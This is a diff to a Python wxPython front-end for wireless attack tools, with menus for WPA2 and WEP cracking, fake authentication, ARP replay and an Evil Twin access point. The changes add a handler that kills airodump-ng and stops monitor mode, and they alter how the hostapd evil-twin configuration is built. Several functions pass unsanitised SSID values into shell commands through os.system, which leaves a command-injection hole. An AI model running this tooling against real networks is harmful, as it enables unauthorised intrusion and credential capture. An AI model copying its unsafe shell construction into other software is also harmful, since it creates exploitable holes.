@@ -20,6 +20,7 @@ from bs4 import BeautifulSoup
 from project_form import *
 from scapy.all import *
 from wp2_crack import *
+from subprocess import *
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -95,15 +96,32 @@ class Example(wx.Frame):
 		############ wireless security ##########
 
 		wirelessbar = wx.Menu()
-		wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')
+		
+		wpa2_submenu = wx.Menu()
+		
+		wpa2_hack = wpa2_submenu.Append(-1, "WPA2 Hacking", "WPA2 Hacking")
+		stDump = wpa2_submenu.Append(-1, 'Kill airodump-ng', 'Kill airodump-ng')
+		
+		#~ wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')
+		
+		
+		
+		wpa2_hack_menu = wx.Menu()
+		
+		wpa2_hack_menu= wirelessbar.AppendMenu(-1, "WPA2 Hacking", wpa2_submenu)
+		#~ wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')
+		
 		wpe2entr = wirelessbar.Append(-1, "Hack WPA2 Entr", "Hacking WPA2 Enterprise")
+		
+		
+		
+		
 		
 		imp = wx.Menu()
 		cmpIVs = imp.Append(-1, 'Caputre IVs', 'Caputre IVs')
 		fakeAuthenticate = imp.Append(-1, "Perform Fake Authentication", "Perform Fake Authentication")
 		replaymode =imp.Append(-1, "ARP Requeste Replay Mode", "ARP Requeste Replay Mode")
 		crackwep = imp.Append(-1,'Crack WEP Hashes','Crack WEP Hashes')
-		
 		
 		wirelessbar.AppendMenu(-1, 'WEP Hacking', imp)
 		evltwin = wirelessbar.Append(-1, 'Evil Twin Attack', 'Perform Evil Twin attack')
@@ -121,8 +139,8 @@ class Example(wx.Frame):
 		
 		############### Cracking Hashes #########
 		crackbar = wx.Menu()
-		WPA2crack = crackbar.Append(-1,'Crack WPA2 Hashes','Crack WPA2 Hashes')
-		WPA2ENTcrack = crackbar.Append(-1,'Crack WPA2ENT Hashes','Crack WPA2 Enterprise Hashes')
+		WPA2crack = crackbar.Append(-1,'Crack WPA2 Handshake','Crack WPA2 Handshake')
+		WPA2ENTcrack = crackbar.Append(-1,'Crack WPA2ENT Challenge/Response','Crack Challenge/Response')
 		menubar.Append(crackbar, 'Cracking')
 		
 		
@@ -180,6 +198,8 @@ class Example(wx.Frame):
 		self.Bind(wx.EVT_MENU, self.probRequest, probrecon)
 		
 		self.Bind(wx.EVT_MENU, self.wireless_scan, wirelessScanner)
+		
+		self.Bind(wx.EVT_MENU, self.stDump_kill, stDump)
 		
 		self.Bind(wx.EVT_MENU, self.fake_page_create, fakelogin)
 		
@@ -398,6 +418,15 @@ class Example(wx.Frame):
 	def OnQuit(self, e):
 		self.Close()
 		
+	def stDump_kill(self, e):
+		os.system("kill  `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
+		os.system("kill  `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
+		monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
+		os.system("airmon-ng stop "+monitoring_interface)
+		os.system("airmon-ng check kill &")
+		
+		
+	
 	def killall(self, e):
 		monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
 		os.system("airmon-ng check kill &")
@@ -665,7 +694,7 @@ EOF"""%wlan_iface)
 			iw_nets = wless_commands.get_wireless_scan(mon_iface)
 			wireless_ssid_file = open('wScan.log', 'w')
 			for iw_net in iw_nets:
-				text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s]\n'
+				text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s]\n\n'
 						% iw_net)
 				read_only_txt.AppendText(text)
 				wireless_ssid_file.write(text)
@@ -1317,7 +1346,7 @@ class EvilWindow(wx.Frame):
 			#~ hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
 			hostapd = open('hostapd-evil.conf', 'wb')
 			#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
-			config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid="+str(SSID)+"\nchannel=1\n#enable_karma=1\n"
+			config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid="+str(SSID.replace('[SSID:','')).strip()+"\nchannel=1\n#enable_karma=1\n"
 			hostapd.write(config_file)
 			hostapd.close()
 			os.system("gnome-terminal -x hostapd hostapd-evil.conf &")
@@ -1417,6 +1446,7 @@ class WPA2_crack(wx.Frame):
 			iw_nets = wless_commands.get_wireless_scan(wlan_iface)
 			iw_scan_file = open('wScan.log', 'w')
 			for iw_net in iw_nets:
+				
 				text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s]\n'
 						% iw_net)
 				self.listbox.Append(text)
@@ -1439,8 +1469,11 @@ class WPA2_crack(wx.Frame):
 		#os.system("mkdir capture")
 		print 'wpa2 hack is started'
 		##os.system("airodump-ng --essid "+str(SSID)+" --write "+str(SSID)+"_crack mon0")
+		#~ print "airodump-ng --essid '%s' --write 'capture/%s_crack' %s &"% (SSID, SSID, mon_iface)
+		
 		command = ("airodump-ng --essid '%s' --write 'capture/%s_crack' %s &"
 				% (SSID, SSID, mon_iface))
+		
 		logging.debug('WPA Crack command: %s', command)
 		#~ os.system("gnome-terminal -x airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0")
 		os.system(command)
@@ -1452,6 +1485,7 @@ class WPA2_crack(wx.Frame):
 	#~ def about(self, event):
 		#~ frm=MyHtmlFrame2(None, "About...")
 		#~ frm.Show()
+		
 
 			
 	
